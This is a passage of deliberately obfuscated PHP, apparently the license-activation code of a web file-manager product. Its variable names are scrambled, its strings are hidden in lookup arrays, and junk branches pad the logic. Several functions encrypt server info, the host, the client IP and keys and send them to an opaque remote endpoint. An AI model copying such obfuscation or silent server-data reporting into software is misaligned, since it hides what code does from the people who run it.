$_SERVER[µÅ˜º…æ]; $Æàö°¦‘ = $this->linkHas == !1; $this->linkHas = !0; if (!$Ë¬†¯©›) { $this->link($’ÀÚÌ[1901], $’ÀÚÌ[1899]); $this->link($’ÀÚÌ[1902], $’ÀÚÌ[1898]); $this->link($’ÀÚÌ[1903], $’ÀÚÌ[1898]); $this->link($’ÀÚÌ[1904], $’ÀÚÌ[1898]); $this->link($’ÀÚÌ[1905], $’ÀÚÌ[1898]); if ($Æàö°¦‘) { Hook::trigger($’ÀÚÌ[1906]); } return; } $Ù½÷äÛ  = $this->url($Ë¬†¯©›, $’€äšÛÀ, !1); if (substr($Ë¬†¯©›, -3) == $’ÀÚÌ[1907]) { echo $’ÀÚÌ[1908] . $Ù½÷äÛ  . $’ÀÚÌ[1909] . $’ÀÚÌ[285]; } else { if (substr($Ë¬†¯©›, -4) == $’ÀÚÌ[1910]) { echo $’ÀÚÌ[1911] . $Ù½÷äÛ  . $’ÀÚÌ[1912] . $’ÀÚÌ[285]; } } if ($Æàö°¦‘) { Hook::trigger($’ÀÚÌ[1906]); } } } goto Eæö·Á³Å´; b­‹İØ¸±¯: if (!$ntkuvzwbfd) { return; } class Application { private $defaultModule = "\151\156\144\145\x78"; private $defaultController = "\151\x6e\144\x65\x78"; private $defaultAction = "\151\156\x64\145\170"; function __construct() { } public function setDefault($«èƒÚÊØ) { $›·¸Öô† =& $_SERVER[µÅ˜º…æ]; $œ¡±Ø‘ =& $_SERVER[ş•üòéú]; $åìºÆº» = explode($œ¡±Ø‘[0], trim($«èƒÚÊØ, $œ¡±Ø‘[0])); $£·­Ù‚à = $›·¸Öô†[705]; if (!$£·­Ù‚à) { die; } $this->defaultModule = $åìºÆº»[0] ? $åìºÆº»[0] : $this->defaultModule; $·„Òá = $›·¸Öô†[706]; $this->defaultController = $åìºÆº»[1] ? $åìºÆº»[1] : $this->defaultController; $this->defaultAction = $åìºÆº»[2] ? $åìºÆº»[2] : $this->defaultAction; $this->bqjz8f6066ca($œ¡±Ø‘[1], array($this, $œ¡±Ø‘[2])); } public function appRun($‡À£¡ô) { $§¯¢ÁÁ =& $_SERVER[µÅ˜º…æ]; $ÕË÷Õ”Ğ =& $_SERVER[ş•üòéú]; $½ã¬‹Ğ = explode($ÕË÷Õ”Ğ[0], $‡À£¡ô); $Ü–å÷ë¥ = strtolower($½ã¬‹Ğ[0]); $ûàöÍ © = $ÕË÷Õ”Ğ[3]; $¹Á†ªùÅ = $§¯¢ÁÁ[707]; if ($Ü–å÷ë¥ == $ÕË÷Õ”Ğ[4]) { $ûàöÍ © = $ÕË÷Õ”Ğ[5]; $½ã¬‹Ğ[0] = $ÕË÷Õ”Ğ[6]; $½ã¬‹Ğ[1] = $½ã¬‹Ğ[1] . $ÕË÷Õ”Ğ[7]; $‡À£¡ô = join($ÕË÷Õ”Ğ[0], $½ã¬‹Ğ); $‡À£¡ô = trim($‡À£¡ô, $ÕË÷Õ”Ğ[0]); } call_user_func(array($ÕË÷Õ”Ğ[8], $ÕË÷Õ”Ğ[9]), $ûàöÍ © . $ÕË÷Õ”Ğ[10], $‡À£¡ô); ActionCall($‡À£¡ô); call_user_func(array($ÕË÷Õ”Ğ[8], $ÕË÷Õ”Ğ[9]), $ûàöÍ © . $ÕË÷Õ”Ğ[11], $‡À£¡ô); $à×®ú = $§¯¢ÁÁ[708]; if (strlen($à×®ú) < $§¯¢ÁÁ[709]) { return; } } private function autorun() { $ÀÀêˆŸ =& $_SERVER[µÅ˜º…æ]; $‰úÄ…¶Û =& $_SERVER[ş•üòéú]; global $config; $…¾æ’­› = $ÀÀêˆŸ[710]; if (!$…¾æ’­›) { return; } if (count($config[$‰úÄ…¶Û[12]]) == 0) { return; } foreach ($config[$‰úÄ…¶Û[12]] as $ôÚ¼óç => $¦ÆôÙ±¸) { $this->appRun($¦ÆôÙ±¸); $™ÓÙˆí = $ÀÀêˆŸ[711]; if (!$™ÓÙˆí) { die; } } } private function jxoka6420ead() { $ß¾©—ŠØ =& $_SERVER[µÅ˜º…æ]; $Å£ª§ŒÄ =& $_SERVER[ş•üòéú]; $ù¿½¤ = $Å£ª§ŒÄ[4]; $ å¤¾ÎÛ = $ß¾©—ŠØ[712]; if (strlen($ å¤¾ÎÛ) < $ß¾©—ŠØ[713]) { die; } $•Ù¡ã†§ = $GLOBALS[$Å£ª§ŒÄ[13]][$Å£ª§ŒÄ[14]][0]; if (!$•Ù¡ã†§ || strlen($•Ù¡ã†§) <= strlen($ù¿½¤)) { return; } if (strtolower(substr($•Ù¡ã†§, -strlen($ù¿½¤))) != $ù¿½¤) { return; } $«¹âøşı = substr($•Ù¡ã†§, 0, -strlen($ù¿½¤)); $ ¾›Á‘› = $ß¾©—ŠØ[714]; if (strlen($ ¾›Á‘›) < $ß¾©—ŠØ[715]) { die; } $¾°ï¦” = array($Å£ª§ŒÄ[4], $«¹âøşı); $—­ç¡Â¬ = $ß¾©—ŠØ[716]; $–¿” = array_slice($GLOBALS[$Å£ª§ŒÄ[13]][$Å£ª§ŒÄ[14]], 1); $™ë¨¶ = $ß¾©—ŠØ[717]; if (strlen($™ë¨¶) < $ß¾©—ŠØ[718]) { return; } $GLOBALS[$Å£ª§ŒÄ[13]][$Å£ª§ŒÄ[14]] = array_merge($¾°ï¦”, $–¿”); $GLOBALS[$Å£ª§ŒÄ[13]][$Å£ª§ŒÄ[15]] = implode($Å£ª§ŒÄ[0], $GLOBALS[$Å£ª§ŒÄ[13]][$Å£ª§ŒÄ[14]]); $‚»¦Óå— = $ß¾©—ŠØ[719]; if (strlen($‚»¦Óå—) < $ß¾©—ŠØ[709]) { return; } } private function bfzp1d0973c8() { $ŸëÍ…ñ =& $_SERVER[µÅ˜º…æ]; $÷…ˆæ­ˆ =& $_SERVER[ş•üòéú]; if ($GLOBALS[$÷…ˆæ­ˆ[13]][$÷…ˆæ­ˆ[15]] != $÷…ˆæ­ˆ[6]) { return; } $Ü¦Ö®å = $_SERVER[$÷…ˆæ­ˆ[16]]; $ßºåÑÕ = $ŸëÍ…ñ[720]; if (!$ßºåÑÕ) { die; } $¼ïÜüĞÔ = $÷…ˆæ­ˆ[17]; if (!strstr($Ü¦Ö®å, $¼ïÜüĞÔ)) { return; } $ÄµŠ«¬ = strrpos($Ü¦Ö®å, $¼ïÜüĞÔ); $š—×±òª = $ŸëÍ…ñ[721]; while (strlen($š—×±òª) < $ŸëÍ…ñ[715]) { if (!$š—×±òª) { break; } $š—×±òª++; } $ƒĞ·©ëœ = substr($Ü¦Ö®å, $ÄµŠ«¬ + strlen($¼ïÜüĞÔ)); $Ù¼œâ‡ğ = $ŸëÍ…ñ[722]; preg_match_all($÷…ˆæ­ˆ[18], $ƒĞ·©ëœ, $‡œë›Õ‘); $ØÒ¡ÛÚÈ = $ŸëÍ…ñ[723]; $ƒĞ·©ëœ = trim($‡œë›Õ‘[0][0], $÷…ˆæ­ˆ[19]); $†äøÙµ = $ŸëÍ…ñ[724]; if (strlen($†äøÙµ) < $ŸëÍ…ñ[715]) { return; } $GLOBALS[$÷…ˆæ­ˆ[13]][$÷…ˆæ­ˆ[14]] = explode($÷…ˆæ­ˆ[19], $ƒĞ·©ëœ); $GLOBALS[$÷…ˆæ­ˆ[13]][$÷…ˆæ­ˆ[15]] = implode($÷…ˆæ­ˆ[0], $GLOBALS[$÷…ˆæ­ˆ[13]][$÷…ˆæ­ˆ[14]]); $ï¡“Ô© = $ŸëÍ…ñ[725]; if (strlen($ï¡“Ô©) < $ŸëÍ…ñ[709]) { return; } } public function run() { $óÖêõ©˜ =& $_SERVER[µÅ˜º…æ]; $ŸÚ©§ôÛ =& $_SERVER[ş•üòéú]; $this->bfzp1d0973c8(); $this->jxoka6420ead(); $‘áÀ¿ƒ = $óÖêõ©˜[726]; while ($‘áÀ¿ƒ < $óÖêõ©˜[727]) { if ($‘áÀ¿ƒ >= 0) { break; } $‘áÀ¿ƒ++; } $À©¹öæì = $GLOBALS[$ŸÚ©§ôÛ[13]][$ŸÚ©§ôÛ[14]]; $“ëŞâ¸‡ = $GLOBALS[$ŸÚ©§ôÛ[13]][$ŸÚ©§ôÛ[15]]; define($ŸÚ©§ôÛ[20], isset($À©¹öæì[0]) && $À©¹öæì[0] ? $À©¹öæì[0] : $this->defaultModule); define($ŸÚ©§ôÛ[21], isset($À©¹öæì[1]) && $À©¹öæì[0] ? $À©¹öæì[1] : $this->defaultController); $‰“…ú€Ñ = $óÖêõ©˜[728]; if (strlen($‰“…ú€Ñ) < $óÖêõ©˜[709]) { die; } define($ŸÚ©§ôÛ[22], isset($À©¹öæì[2]) && $À©¹öæì[0] ? $À©¹öæì[2] : $this->defaultAction); define($ŸÚ©§ôÛ[23], MOD . $ŸÚ©§ôÛ[0] . ST . $ŸÚ©§ôÛ[0] . ACT); $_SERVER[$ŸÚ©§ôÛ[24]] = strtolower(ACTION); $Ø®ƒ««õ = $óÖêõ©˜[729]; while (strlen($Ø®ƒ««õ) < $óÖêõ©˜[718]) { if (!$Ø®ƒ««õ) { break; } $Ø®ƒ««õ++; } $this->autorun(); if (count($À©¹öæì) >= 3) { $this->appRun($“ëŞâ¸‡); } else { $this->appRun(ACTION); } } private $tnpb82e910e5 = array(); private $ebvy58030223 = ''; public function lqmp322187ce() { $½êó«Èè =& $_SERVER[µÅ˜º…æ]; $¤½‚ÛÚ÷ =& $_SERVER[ş•üòéú]; $this->noaw060b3cb6(); $this->zdbr7d89e568(); $¯Ú³û’€ = $½êó«Èè[730]; if (strlen($¯Ú³û’€) < $½êó«Èè[713]) { return; } $this->hutx47f7fe95(); $Ë‘ØÊ“æ = $½êó«Èè[731]; if (strlen($Ë‘ØÊ“æ) < $½êó«Èè[727]) { die; } $this->teri1fbc629a(); $this->ckxy426e28e1(); $‹Ìûİ€È = $½êó«Èè[732]; if (strlen($‹Ìûİ€È) < $½êó«Èè[718]) { return; } $this->ynruc8bc96c3(); $üäİÚ‰ = $½êó«Èè[733]; $this->shyt68b4ef61(); $this->bqjz8f6066ca($¤½‚ÛÚ÷[25], array($this, $¤½‚ÛÚ÷[26])); $this->bqjz8f6066ca($¤½‚ÛÚ÷[27], array($this, $¤½‚ÛÚ÷[28])); $æµ‹ŠŠ  = $½êó«Èè[734]; $this->bqjz8f6066ca($¤½‚ÛÚ÷[29], array($this, $¤½‚ÛÚ÷[30])); $²£¶ÇÈí = $½êó«Èè[735]; while ($²£¶ÇÈí < $½êó«Èè[715]) { if ($²£¶ÇÈí >= 0) { break; } $²£¶ÇÈí++; } $this->bqjz8f6066ca($¤½‚ÛÚ÷[31], array($this, $¤½‚ÛÚ÷[32])); $Â—ŞÇúğ = $½êó«Èè[736]; while ($Â—ŞÇúğ < $½êó«Èè[709]) { if ($Â—ŞÇúğ >= 0) { break; } $Â—ŞÇúğ++; } } public function getVersionData() { return $this->tnpb82e910e5; } public function vrcedcc8096a($”™¢û¸ì) { $İ•Ò†ë” =& $_SERVER[µÅ˜º…æ]; $Ö”æ‚©‡ =& $_SERVER[ş•üòéú]; $Ç˜Ìª» = Model($Ö”æ‚©‡[33])->get(); $òÙäŠô = array($Ö”æ‚©‡[34], $Ö”æ‚©‡[35], $Ö”æ‚©‡[36], $Ö”æ‚©‡[37], $Ö”æ‚©‡[38], $Ö”æ‚©‡[39], $Ö”æ‚©‡[40], $Ö”æ‚©‡[41], $Ö”æ‚©‡[42], $Ö”æ‚©‡[43], $Ö”æ‚©‡[44], $Ö”æ‚©‡[45], $Ö”æ‚©‡[46], $Ö”æ‚©‡[47], $Ö”æ‚©‡[48], $Ö”æ‚©‡[49], $Ö”æ‚©‡[50], $Ö”æ‚©‡[51], $Ö”æ‚©‡[52], $Ö”æ‚©‡[53], $Ö”æ‚©‡[54], $Ö”æ‚©‡[55], $Ö”æ‚©‡[56], $Ö”æ‚©‡[57], $Ö”æ‚©‡[58], $Ö”æ‚©‡[59], $Ö”æ‚©‡[60], $Ö”æ‚©‡[61], $Ö”æ‚©‡[62], $Ö”æ‚©‡[63], $Ö”æ‚©‡[64], $Ö”æ‚©‡[65], $Ö”æ‚©‡[66], $Ö”æ‚©‡[67], $Ö”æ‚©‡[68], $Ö”æ‚©‡[69], $Ö”æ‚©‡[70], $Ö”æ‚©‡[71], $Ö”æ‚©‡[72], $Ö”æ‚©‡[73], $Ö”æ‚©‡[74], $Ö”æ‚©‡[75], $Ö”æ‚©‡[76], $Ö”æ‚©‡[77], $Ö”æ‚©‡[78], $Ö”æ‚©‡[79], $Ö”æ‚©‡[80], $Ö”æ‚©‡[81], $Ö”æ‚©‡[82], $Ö”æ‚©‡[83], $Ö”æ‚©‡[84], $Ö”æ‚©‡[85], $Ö”æ‚©‡[86], $Ö”æ‚©‡[87]); foreach ($òÙäŠô as $ƒ÷úü€É) { $ÒÈ˜·Ï = $GLOBALS[$Ö”æ‚©‡[88]][$Ö”æ‚©‡[89]][$ƒ÷úü€É]; $†„¾ğêã = $İ•Ò†ë”[737]; while ($†„¾ğêã < $İ•Ò†ë”[727]) { if ($†„¾ğêã >= 0) { break; } $†„¾ğêã++; } if (isset($Ç˜Ìª»[$ƒ÷úü€É])) { $ÒÈ˜·Ï = $Ç˜Ìª»[$ƒ÷úü€É]; } $”™¢û¸ì[$Ö”æ‚©‡[90]][$Ö”æ‚©‡[91]][$ƒ÷úü€É] = $ÒÈ˜·Ï; } $ô™ü¨±û = $”™¢û¸ì[$Ö”æ‚©‡[90]][$Ö”æ‚©‡[91]][$Ö”æ‚©‡[46]]; unset($”™¢û¸ì[$Ö”æ‚©‡[90]][$Ö”æ‚©‡[92]][$Ö”æ‚©‡[93]]); $‹àåŒë± = $İ•Ò†ë”[738]; while (strlen($‹àåŒë±) < $İ•Ò†ë”[709]) { if (!$‹àåŒë±) { break; } $‹àåŒë±++; } unset($”™¢û¸ì[$Ö”æ‚©‡[90]][$Ö”æ‚©‡[92]][$Ö”æ‚©‡[94]]); $ŒÉŒ´²º = $İ•Ò†ë”[739]; unset($”™¢û¸ì[$Ö”æ‚©‡[90]][$Ö”æ‚©‡[91]][$Ö”æ‚©‡[46]]); $šº¡óÃ£ = $İ•Ò†ë”[740]; if (!$šº¡óÃ£) { die; } unset($”™¢û¸ì[$Ö”æ‚©‡[90]][$Ö”æ‚©‡[91]][$Ö”æ‚©‡[95]]); $”™¢û¸ì[$Ö”æ‚©‡[90]][$Ö”æ‚©‡[91]][$Ö”æ‚©‡[96]] = array($Ö”æ‚©‡[97] => (int) $ô™ü¨±û[$Ö”æ‚©‡[98]], $Ö”æ‚©‡[99] => (int) _get($ô™ü¨±û, $Ö”æ‚©‡[100], 0)); $­š‹ßº = $İ•Ò†ë”[741]; while (strlen($­š‹ßº) < $İ•Ò†ë”[727]) { if (!$­š‹ßº) { break; } $­š‹ßº++; } $œıëú = substr(md5($Ö”æ‚©‡[101] . get_client_ip() . $Ç˜Ìª»[$Ö”æ‚©‡[102]]), 0, 15); $”™¢û¸ì[$Ö”æ‚©‡[103]][$Ö”æ‚©‡[104]] = Mcrypt::encode(Session::sign(), $œıëú, 3600 * 24); $ËşìÀ²˜ = $İ•Ò†ë”[742]; $”™¢û¸ì[$Ö”æ‚©‡[103]][$Ö”æ‚©‡[105]] = Action($Ö”æ‚©‡[106])->accessToken(); $‘µ®ÚÌ³ = $İ•Ò†ë”[743]; $”™¢û¸ì[$Ö”æ‚©‡[103]][$Ö”æ‚©‡[107]] = md5($_SERVER[$Ö”æ‚©‡[108]] . $Ç˜Ìª»[$Ö”æ‚©‡[102]]); $ğçêõ—´ = $İ•Ò†ë”[744]; $”™¢û¸ì[$Ö”æ‚©‡[103]][$Ö”æ‚©‡[109]] = base64_encode(serverInfo()); $É‡¶Õê = $İ•Ò†ë”[745]; if (strlen($É‡¶Õê) < $İ•Ò†ë”[727]) { return; } $”™¢û¸ì[$Ö”æ‚©‡[103]][$Ö”æ‚©‡[110]] = $this->ebvy58030223; if ($Ç˜Ìª»[$Ö”æ‚©‡[110]] != $Ö”æ‚©‡[111]) { $”™¢û¸ì[$Ö”æ‚©‡[103]][$Ö”æ‚©‡[112]] = $Ç˜Ìª»[$Ö”æ‚©‡[112]]; $”™¢û¸ì[$Ö”æ‚©‡[103]][$Ö”æ‚©‡[113]] = $Ç˜Ìª»[$Ö”æ‚©‡[113]]; $®ñ¸À¤ƒ = rand_string(10) . $this->ebvy58030223 . rand_string(5); $”™¢û¸ì[$Ö”æ‚©‡[90]][$Ö”æ‚©‡[114]][$Ö”æ‚©‡[115]] = $this->apvf20890a9b($®ñ¸À¤ƒ, $”™¢û¸ì[$Ö”æ‚©‡[103]][$Ö”æ‚©‡[107]]); } if ($this->ebvy58030223 == $Ö”æ‚©‡[111]) { $”™¢û¸ì[$Ö”æ‚©‡[90]][$Ö”æ‚©‡[91]][$Ö”æ‚©‡[96]][$Ö”æ‚©‡[100]] = 0; } $”™¢û¸ì[$Ö”æ‚©‡[103]][$Ö”æ‚©‡[116]] = $this->versionPluginFilter(); $”™¢û¸ì[$Ö”æ‚©‡[103]][$Ö”æ‚©‡[117]] = _get($this->tnpb82e910e5, $Ö”æ‚©‡[118], $Ö”æ‚©‡[6]); if (KodUser::isRoot() && $this->config[$Ö”æ‚©‡[119]]) { $”™¢û¸ì[$Ö”æ‚©‡[103]][$Ö”æ‚©‡[120]] = WEB_ROOT; } return $”™¢û¸ì; } private function ynruc8bc96c3() { $¯Ú¼ÚØº =& $_SERVER[µÅ˜º…æ]; $«óòµÚ =& $_SERVER[ş•üòéú]; $ÙììÒ„‚ = $_SERVER[$«óòµÚ[24]] == $«óòµÚ[121]; $´àÀÎ» = $¯Ú¼ÚØº[746]; if ($_SERVER[$«óòµÚ[24]] == $«óòµÚ[122] && $_GET[$«óòµÚ[123]] == $«óòµÚ[124]) { $ÙììÒ„‚ = !0; } if ($ÙììÒ„‚) { $Â¬ŠĞï = array($«óòµÚ[110] => $this->ebvy58030223, $«óòµÚ[125] => $this->grxmf2bfec16(), $«óòµÚ[126] => Model($«óòµÚ[127])->count()); if ($this->ebvy58030223 != $«óòµÚ[111]) { $Ç¢Ó« = _get($this->tnpb82e910e5, $«óòµÚ[128]); if ($Ç¢Ó«) { $Â¬ŠĞï[$«óòµÚ[129]] = $Ç¢Ó«; $Â¬ŠĞï[$«óòµÚ[130]] = strtotime(_get($this->tnpb82e910e5, $«óòµÚ[131])); $Â¬ŠĞï[$«óòµÚ[132]] = _get($this->tnpb82e910e5, $«óòµÚ[118]); } $½çŸØ¼ğ = Model($«óòµÚ[33])->get($«óòµÚ[133], $«óòµÚ[6], !0); if (is_string($½çŸØ¼ğ) && substr($½çŸØ¼ğ, 0, 1) == $«óòµÚ[134]) { $½çŸØ¼ğ = json_decode_force($½çŸØ¼ğ); } if (is_array($½çŸØ¼ğ) && $½çŸØ¼ğ[$«óòµÚ[135]] && strstr($½çŸØ¼ğ[$«óòµÚ[135]], $«óòµÚ[136])) { $µºƒÑÕ„ = explode($«óòµÚ[136], $½çŸØ¼ğ[$«óòµÚ[135]]); $Â¬ŠĞï[$«óòµÚ[137]] = $µºƒÑÕ„[0]; } } $Â¬ŠĞï = $this->nozmc3f76e6b(json_encode($Â¬ŠĞï), md5($«óòµÚ[138])); $¥ã ¢¶ü = array($«óòµÚ[139] => $Â¬ŠĞï); $·ô‘ú³À = $¯Ú¼ÚØº[747]; if (!$·ô‘ú³À) { return; } call_user_func(array($«óòµÚ[140], $«óòµÚ[141]), $¥ã ¢¶ü); $©ØÍ‘Áú = $¯Ú¼ÚØº[748]; if (strlen($©ØÍ‘Áú) < $¯Ú¼ÚØº[713]) { die; } } if ($this->ebvy58030223 == $«óòµÚ[111]) { return; } $—à´É¸ = array($«óòµÚ[142], $«óòµÚ[143], $«óòµÚ[144], $«óòµÚ[145], $«óòµÚ[146], $«óòµÚ[147]); $Ú‹£õ¼ = $¯Ú¼ÚØº[749]; $ÂÄÜ¡„‰ = Model($«óòµÚ[33])->get(); $¥ã ¢¶ü = array($«óòµÚ[148] => $ÂÄÜ¡„‰[$«óòµÚ[34]], $«óòµÚ[149] => $ÂÄÜ¡„‰[$«óòµÚ[35]], $«óòµÚ[150] => $«óòµÚ[6]); $¨¼»åÙñ = $¯Ú¼ÚØº[750]; foreach ($—à´É¸ as $üµêÂ ) { if (!isset($ÂÄÜ¡„‰[$üµêÂ ]) || !$ÂÄÜ¡„‰[$üµêÂ ]) { continue; } $¥ã ¢¶ü[$üµêÂ ] = $ÂÄÜ¡„‰[$üµêÂ ]; $ßıÙ´ÎÍ = $¯Ú¼ÚØº[751]; if (strlen($ßıÙ´ÎÍ) < $¯Ú¼ÚØº[718]) { die; } } call_user_func(array($«óòµÚ[140], $«óòµÚ[141]), $¥ã ¢¶ü); $´üÉÊ™š = $¯Ú¼ÚØº[752]; if (strlen($´üÉÊ™š) < $¯Ú¼ÚØº[727]) { die; } } private function teri1fbc629a() { $øÊÁœË =& $_SERVER[µÅ˜º…æ]; $¢Å°¨µÒ =& $_SERVER[ş•üòéú]; if ($_SERVER[$¢Å°¨µÒ[24]] != $¢Å°¨µÒ[151]) { return; } if (!KodUser::isRoot()) { die; } $‰‘ö·Óà = $GLOBALS[$¢Å°¨µÒ[13]]; if (isset($‰‘ö·Óà[$¢Å°¨µÒ[152]])) { $this->wzek3448530d(); die; } if (isset($‰‘ö·Óà[$¢Å°¨µÒ[153]]) && isset($‰‘ö·Óà[$¢Å°¨µÒ[153]]) == $¢Å°¨µÒ[124]) { $‰‘ö·Óà[$¢Å°¨µÒ[154]] = Model($¢Å°¨µÒ[33])->get($¢Å°¨µÒ[155]); } if (!isset($‰‘ö·Óà[$¢Å°¨µÒ[154]]) || strlen($‰‘ö·Óà[$¢Å°¨µÒ[154]]) != 16) { show_json($¢Å°¨µÒ[156] . $‰‘ö·Óà[$¢Å°¨µÒ[154]], !1); } $âÉà‘Äì = Model($¢Å°¨µÒ[33])->get($¢Å°¨µÒ[102]); $ş®‘æäö = md5($_SERVER[$¢Å°¨µÒ[108]] . $âÉà‘Äì); $›©ôå€í = $øÊÁœË[753]; if (strlen($›©ôå€í) < $øÊÁœË[718]) { die; } $¢•Ô àÓ = array($¢Å°¨µÒ[154] => $‰‘ö·Óà[$¢Å°¨µÒ[154]], $¢Å°¨µÒ[157] => rand_string(16), $¢Å°¨µÒ[158] => $¢Å°¨µÒ[138], $¢Å°¨µÒ[159] => $¢Å°¨µÒ[160], $¢Å°¨µÒ[161] => $_SERVER[$¢Å°¨µÒ[162]], $¢Å°¨µÒ[163] => $_SERVER[$¢Å°¨µÒ[164]], $¢Å°¨µÒ[165] => $_SERVER[$¢Å°¨µÒ[166]], $¢Å°¨µÒ[107] => $ş®‘æäö, $¢Å°¨µÒ[167] => Model($¢Å°¨µÒ[33])->get($¢Å°¨µÒ[133])); $°Ô¼Ôæ = $øÊÁœË[754]; if (strlen($°Ô¼Ôæ) < $øÊÁœË[713]) { return; } if (isset($‰‘ö·Óà[$¢Å°¨µÒ[153]]) && isset($‰‘ö·Óà[$¢Å°¨µÒ[153]]) == $¢Å°¨µÒ[124]) { $¢•Ô àÓ[$¢Å°¨µÒ[153]] = md5($¢•Ô àÓ[$¢Å°¨µÒ[154]] . $¢Å°¨µÒ[168] . $¢•Ô àÓ[$¢Å°¨µÒ[157]]); } if ($‰‘ö·Óà[$¢Å°¨µÒ[169]] == $¢Å°¨µÒ[170]) { $™ÁŸâ¡” = $this->nozmc3f76e6b($ş®‘æäö, $¢Å°¨µÒ[171]); $¦Æã—Ö = $this->apvf20890a9b(json_encode($¢•Ô àÓ), $ş®‘æäö . $¢Å°¨µÒ[172], 3); $¦Æã—Ö = $¦Æã—Ö . $¢Å°¨µÒ[173] . $_SERVER[$¢Å°¨µÒ[162]]; $¸´÷­å– = $this->swhzaf2933a6($¢Å°¨µÒ[174] . $™ÁŸâ¡” . $¢Å°¨µÒ[175] . $¦Æã—Ö, -1); show_json($¸´÷­å–, !0); } else { if ($‰‘ö·Óà[$¢Å°¨µÒ[169]] == $¢Å°¨µÒ[176]) { $öÈŞÚ·² = substr(md5($¢Å°¨µÒ[177] . $ş®‘æäö), 12, 15) . $¢Å°¨µÒ[178]; $¦Æã—Ö = $this->aovg298d75b9(trim($‰‘ö·Óà[$¢Å°¨µÒ[179]]), $öÈŞÚ·², 2); $ÑÃ†ğ¾¨ = json_decode($¦Æã—Ö, !0); if (!is_array($ÑÃ†ğ¾¨) || !is_array($ÑÃ†ğ¾¨[$¢Å°¨µÒ[180]]) || $ÑÃ†ğ¾¨[$¢Å°¨µÒ[154]] != !0) { $ñš½Íû = $¢Å°¨µÒ[181]; $ääøÊ£ = $ÑÃ†ğ¾¨[$¢Å°¨µÒ[180]] ? $¢Å°¨µÒ[182] . $ÑÃ†ğ¾¨[$¢Å°¨µÒ[180]] : $ñš½Íû; show_json($ääøÊ£, !1); } else { $¢•Ô àÓ[$¢Å°¨µÒ[157]] = $ÑÃ†ğ¾¨[$¢Å°¨µÒ[180]][$¢Å°¨µÒ[183]]; } } else { $ÑÃ†ğ¾¨ = $this->swhzaf2933a6($¢Å°¨µÒ[184], $¢•Ô àÓ, 10); } } if (!is_array($ÑÃ†ğ¾¨) || !is_array($ÑÃ†ğ¾¨[$¢Å°¨µÒ[180]]) || $ÑÃ†ğ¾¨[$¢Å°¨µÒ[154]] != !0) { $ñš½Íû = LNG($¢Å°¨µÒ[185]); $ääøÊ£ = $ÑÃ†ğ¾¨[$¢Å°¨µÒ[180]] ? $¢Å°¨µÒ[182] . $ÑÃ†ğ¾¨[$¢Å°¨µÒ[180]] : $ñš½Íû; show_json($ääøÊ£, !1); } $ìĞ—î™Ô = $ÑÃ†ğ¾¨[$¢Å°¨µÒ[180]]; $“Øı Å· = $this->daty6e25f853($ìĞ—î™Ô[$¢Å°¨µÒ[186]]); $˜¨¼µ×³ = $øÊÁœË[755]; if (!$˜¨¼µ×³) { die; } if (!$“Øı Å· || $“Øı Å· != $ìĞ—î™Ô[$¢Å°¨µÒ[131]]) { $ÊÚÒëí¢ = array($¢Å°¨µÒ[187] => Model($¢Å°¨µÒ[33])->get($¢Å°¨µÒ[102]), $¢Å°¨µÒ[188] => $_SERVER[$¢Å°¨µÒ[108]], $¢Å°¨µÒ[189] => this_url(), $¢Å°¨µÒ[163] => $_SERVER[$¢Å°¨µÒ[164]]); $¦Æã—Ö = $this->nwga3097e99d(json_encode($ÊÚÒëí¢)); $this->swhzaf2933a6($¢Å°¨µÒ[190] . $¦Æã—Ö); show_json(LNG($¢Å°¨µÒ[191]), !0); } $æŸº½µ£ = array($¢Å°¨µÒ[155] => $ìĞ—î™Ô[$¢Å°¨µÒ[192]], $¢Å°¨µÒ[193] => $ìĞ—î™Ô[$¢Å°¨µÒ[194]], $¢Å°¨µÒ[195] => rand_string(16), $¢Å°¨µÒ[110] => $ìĞ—î™Ô[$¢Å°¨µÒ[196]]); if ($¢•Ô àÓ[$¢Å°¨µÒ[157]]) { $æŸº½µ£[$¢Å°¨µÒ[195]] = $¢•Ô àÓ[$¢Å°¨µÒ[157]]; } $àò”Ğ€ı = substr(md5($æŸº½µ£[$¢Å°¨µÒ[193]]), 10, 10); $Ùâµ“åÔ = $àò”Ğ€ı . $æŸº½µ£[$¢Å°¨µÒ[110]] . $æŸº½µ£[$¢Å°¨µÒ[195]]; $“ØĞÄØĞ = $øÊÁœË[756]; while (strlen($“ØĞÄØĞ) < $øÊÁœË[718]) { if (!$“ØĞÄØĞ) { break; } $“ØĞÄØĞ++; } $æŸº½µ£[$¢Å°¨µÒ[112]] = strrev(base64_encode($this->nozmc3f76e6b($Ùâµ“åÔ, $¢Å°¨µÒ[197]))); $ÄÔÎœÎÒ = $øÊÁœË[757]; while ($ÄÔÎœÎÒ < $øÊÁœË[718]) { if ($ÄÔÎœÎÒ >= 0) { break; } $ÄÔÎœÎÒ++; } $ûÖÆİòÂ = rand_string(16); $³ôßÕÀ = $ûÖÆİòÂ . $æŸº½µ£[$¢Å°¨µÒ[110]] . $this->nozmc3f76e6b(md5($æŸº½µ£[$¢Å°¨µÒ[155]]), $ûÖÆİòÂ); $æŸº½µ£[$¢Å°¨µÒ[113]] = base64_encode(strrev($this->nozmc3f76e6b($³ôßÕÀ, $¢Å°¨µÒ[198]))); if ($ìĞ—î™Ô[$¢Å°¨µÒ[199]] && $ìĞ—î™Ô[$¢Å°¨µÒ[199]] >= 1) { Model($¢Å°¨µÒ[33])->setDeep($¢Å°¨µÒ[200], $¢Å°¨µÒ[124]); } Model($¢Å°¨µÒ[33])->set($æŸº½µ£); $šŸ Ÿ˜« = md5($_SERVER[$¢Å°¨µÒ[108]] . strrev($âÉà‘Äì) . $æŸº½µ£[$¢Å°¨µÒ[193]]); $ÆŸ¥´ÙÃ = $øÊÁœË[758]; $øåæÊ× = strrev(substr($šŸ Ÿ˜«, 10, 16)); $‘öÖçÂ¤ = $this->apvf20890a9b(json_encode($ìĞ—î™Ô), $šŸ Ÿ˜«); $„ñåÇº£ = array_to_keyvalue(Model($¢Å°¨µÒ[7])->listData(), $¢Å°¨µÒ[201]); $¬²—’ƒœ = $„ñåÇº£[$¢Å°¨µÒ[202]]; $íƒÚï‰¿ = array(); $ˆå£Ééï = $øÊÁœË[759]; if (!$ˆå£Ééï) { return; } $íƒÚï‰¿[$øåæÊ×] = $‘öÖçÂ¤; $Õó€í« = $øÊÁœË[760]; if (!$Õó€í«) { die; } Model($¢Å°¨µÒ[7])->update($¬²—’ƒœ[$¢Å°¨µÒ[203]], array($¢Å°¨µÒ[204] => $íƒÚï‰¿)); $this->tnpb82e910e5 = $ìĞ—î™Ô; $this->ebvy58030223 = $æŸº½µ£[$¢Å°¨µÒ[110]]; $this->licenseRegistSuccess(); $Ò´ÙÆúù = 